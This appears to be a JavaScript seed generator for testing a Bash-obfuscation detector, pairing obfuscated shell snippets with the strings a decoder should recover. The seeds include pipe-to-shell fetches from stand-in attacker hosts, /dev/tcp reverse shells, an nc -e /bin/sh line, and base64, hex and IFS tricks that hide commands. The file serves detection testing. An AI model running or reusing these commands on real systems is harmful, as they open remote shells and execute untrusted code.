'use strict';
// ════════════════════════════════════════════════════════════════════════════
// grammars/bash-grammar.js — deterministic seed generator for Bash / POSIX
// shell obfuscation (the bash-obfuscation.js surface: B1 variable expansion,
// B2 ANSI-C quoting, B3 printf chains, B4 pipe-to-shell, B5 command
// substitution unrolling, B6 IFS / variable concatenation,
// /dev/tcp reverse shells).
// ════════════════════════════════════════════════════════════════════════════

const BASH_TECHNIQUE_CATALOG = Object.freeze([
  'Bash Variable Expansion (line)',
  'Bash Variable Expansion (partial)',
  'Bash ANSI-C Quoting',
  'Bash printf Chain',
  'Bash Pipe-to-Shell (live fetch)',
  'Bash base64-pipe-to-Shell',
  'Bash base64-here-string-to-Shell',
  'Bash xxd-here-string-to-Shell',
  'Bash eval $(echo … | base64 -d)',
  'Bash eval $(printf …)',
  'Bash IFS Reassembly (structural)',
  'Bash IFS Reassembly',
  'Bash Variable Concatenation',
  'Bash Variable Concatenation (partial)',
  'Bash /dev/tcp Reverse Shell',
]);

function makeRng(seed) {
  let s = (seed | 0) || 0xBA55BA55;
  return {
    next() { s ^= s << 13; s ^= s >>> 17; s ^= s << 5; return s >>> 0; },
    int(n) { return this.next() % Math.max(1, n); },
    pick(arr) { return arr[this.int(arr.length)]; },
  };
}

function makeSeed(text, expectedSubstring) {
  const buf = Buffer.from(text, 'utf8');
  if (expectedSubstring) {
    Object.defineProperty(buf, '_expectedSubstring', {
      value: expectedSubstring,
      enumerable: false,
    });
  }
  return buf;
}

// ── Branch generators ─────────────────────────────────────────────────────

function genVariableExpansion() {
  // B1 — ${V:n:m}, ${V//x/y}, ${V/#prefix/}, ${V:-default}, ${V/%suffix/}
  // The decoder resolves these against earlier V=… literal assignments.
  const out = [];
  // Simple substring slicing
  out.push(makeSeed(
    'V=powershell_is_long\necho ${V:0:10}',
    'powershell',
  ));
  // Global substitution
  out.push(makeSeed(
    'X=aXbXcXwhoamiXdX\necho ${X//X/}',
    'whoami',
  ));
  // Prefix strip
  out.push(makeSeed(
    'P=prefix_curl_payload\necho ${P#prefix_}',
    'curl',
  ));
  // Suffix strip
  out.push(makeSeed(
    'S=/usr/bin/bash_extra\necho ${S%_extra}',
    '/usr/bin/bash',
  ));
  // Default value expansion
  out.push(makeSeed(
    'unset CMD\necho ${CMD:-wget}',
    'wget',
  ));
  return out;
}

function genAnsiCQuoting() {
  // B2 — $'\xNN' ANSI-C quoting. Decodes hex escapes to bytes.
  // "whoami" = 77 68 6F 61 6D 69
  const out = [];
  out.push(makeSeed("sh -c $'\\x77\\x68\\x6f\\x61\\x6d\\x69'", 'whoami'));
  // Octal escapes
  out.push(makeSeed("echo $'\\167\\150\\157\\141\\155\\151'", 'whoami'));
  // Mix of hex and control chars
  out.push(makeSeed("bash -c $'\\x63\\x75\\x72\\x6c\\x20-s'", 'curl'));
  // \u unicode form
  out.push(makeSeed("printf '%s' $'\\u0063\\u0075\\u0072\\u006c'", 'curl'));
  return out;
}

function genPrintfChain() {
  // B3 — printf '\xNN…', printf '%b' '…'
  const out = [];
  // printf '\xNN' chain - "wget"
  out.push(makeSeed("printf '\\x77\\x67\\x65\\x74' | sh", 'wget'));
  // printf '%b' with embedded escapes
  out.push(makeSeed("printf '%b' '\\x63\\x75\\x72\\x6c' | sh", 'curl'));
  // printf -v assignment to var then eval
  out.push(makeSeed("printf -v cmd '\\x6e\\x63' && $cmd -e /bin/sh 10.0.0.1 4444", 'nc'));
  return out;
}

function genPipeToShell() {
  // B4 — curl|sh, wget|sh. Two-tier: live-fetch (detection-only) vs
  // base64-pipe-to-sh (decodes upstream).
  const out = [];
  // Live fetch
  out.push(makeSeed(
    'curl -sL https://attacker.example.com/payload.sh | sh',
    'curl',
  ));
  out.push(makeSeed(
    'wget -qO- http://evil.example.com/x.sh | bash',
    'wget',
  ));
  // base64-decode-pipe-to-sh (the literal-source variant that decodes
  // the upstream). "echo d2hvYW1p | base64 -d | sh" → "whoami"
  out.push(makeSeed(
    'echo d2hvYW1p | base64 -d | sh',
    'whoami',
  ));
  // base64 here-string
  out.push(makeSeed(
    'base64 -d <<< "d2hvYW1p" | sh',
    'whoami',
  ));
  // xxd here-string - "whoami" = 77686f616d69
  out.push(makeSeed(
    'xxd -r -p <<< "77686f616d69" | sh',
    'whoami',
  ));
  return out;
}

function genEvalUnroll() {
  // B5 — eval $(…), eval `…`, source <(…), bash <(…)
  const out = [];
  // eval $(echo | base64 -d)
  out.push(makeSeed(
    'eval $(echo "d2hvYW1p" | base64 -d)',
    'whoami',
  ));
  // eval $(printf …)
  out.push(makeSeed(
    "eval $(printf '\\x77\\x68\\x6f\\x61\\x6d\\x69')",
    'whoami',
  ));
  // Backtick form
  out.push(makeSeed(
    'eval `echo d2hvYW1p | base64 -d`',
    'whoami',
  ));
  return out;
}

function genIfsAndConcat() {
  // B6 — IFS / brace-expansion fragmentation, {l,s}=…; $l$s
  const out = [];
  // IFS=… abuse — structural recognition even if we can't fully resolve
  out.push(makeSeed(
    'IFS=_;cmd=wget_-qO-_http://evil.example.com/x;$cmd',
    'wget',
  ));
  // Variable concat: l=who; a=ami; $l$a
  out.push(makeSeed(
    'l=who; a=ami; $l$a',
    'whoami',
  ));
  // Partial (unresolved) concat
  out.push(makeSeed(
    'a=cu; echo $a$UNDEFINED_B$UNDEFINED_C',
    'cu',
  ));
  // Three-way concat
  out.push(makeSeed(
    'p=pow; q=er; r=shell; $p$q$r',
    'powershell',
  ));
  return out;
}

function genDevTcp() {
  // /dev/tcp bash built-in reverse shell primitive.
  return [
    makeSeed(
      'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
      '/dev/tcp',
    ),
    makeSeed(
      'exec 3<>/dev/tcp/attacker.example.com/8080; cat <&3',
      '/dev/tcp',
    ),
  ];
}

function generateBashSeeds() {
  const rng = makeRng(0xBA55BA55);
  void rng; // reserved for future parameter sweeps
  return [
    ...genVariableExpansion(),
    ...genAnsiCQuoting(),
    ...genPrintfChain(),
    ...genPipeToShell(),
    ...genEvalUnroll(),
    ...genIfsAndConcat(),
    ...genDevTcp(),
  ];
}

module.exports = { generateBashSeeds, BASH_TECHNIQUE_CATALOG };
